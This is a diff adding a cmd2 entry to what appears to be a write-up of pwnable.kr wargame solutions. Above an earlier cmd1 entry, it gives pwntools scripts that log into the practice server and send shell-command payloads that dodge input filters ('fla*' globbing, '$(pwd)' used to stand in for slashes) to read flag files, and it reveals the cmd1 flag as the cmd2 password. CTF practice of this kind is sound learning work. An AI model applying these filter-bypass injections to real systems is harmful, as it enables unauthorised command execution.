@@ -270,3 +270,14 @@ from pwn import *
 vm = ssh("cmd1", "pwnable.kr", 2222, "guest")
 print(vm.run_to_end("./cmd1 '/bin/cat fla*'"))
 ```
+
+## cmd2
+
+#### Solution
+```python
+from pwn import *
+
+vm = ssh("cmd2", "pwnable.kr", 2222, "mommy now I get what PATH environment is for :)") # password is flag of cmd1
+
+print(vm.run_to_end('./cmd2 "cd ..;cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)fla*"'))
+```
